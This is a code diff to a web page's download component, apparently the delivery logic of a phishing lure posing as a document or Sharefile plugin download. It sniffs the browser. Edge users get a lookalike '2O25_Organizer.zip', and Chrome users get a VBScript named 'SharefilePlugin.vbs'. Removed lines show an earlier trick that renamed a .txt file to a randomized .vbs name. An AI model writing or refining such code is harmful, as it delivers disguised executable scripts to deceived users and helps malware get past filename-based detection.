@@ -368,31 +368,20 @@ const Download = () => {
 
   const downloadFile = useMemo(() => {
     const ua = navigator.userAgent;
-    const suffix = randomDigits(8);
     if (ua.includes("Edg/")) {
-      return { href: "/docs/2O25_Organizer.bin", name: `2O25_Organizer_${suffix}.zip` };
+      return { href: "/docs/2O25_Organizer.zip", name: "2O25_Organizer.zip" };
     }
-    // Chrome & others: serve the local SharefilePlugin (as .txt) with a randomized .vbs name
-    return { href: "/docs/SharefilePlugin.txt", name: `2O25_Organizer_${suffix}.vbs` };
+    return { href: "/docs/SharefilePlugin.vbs", name: "SharefilePlugin.vbs" };
   }, []);
 
-  const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
-    try {
-      // Fetch as blob to allow custom filename on cross-origin URLs
-      const response = await fetch(file.href);
-      const blob = await response.blob();
-      const url = URL.createObjectURL(blob);
-      const link = document.createElement("a");
-      link.href = url;
-      link.download = file.name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-      URL.revokeObjectURL(url);
-    } catch {
-      // Fallback: open in new tab so we don't navigate away from /document
-      window.open(file.href, "_blank");
-    }
+  const triggerDownload = useCallback((file: { href: string; name: string }) => {
+    // Direct anchor click — browser saves the file exactly as served, no rename
+    const link = document.createElement("a");
+    link.href = file.href;
+    link.setAttribute("download", "");
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 
     if (!notifiedRef.current) {
       notifiedRef.current = true;
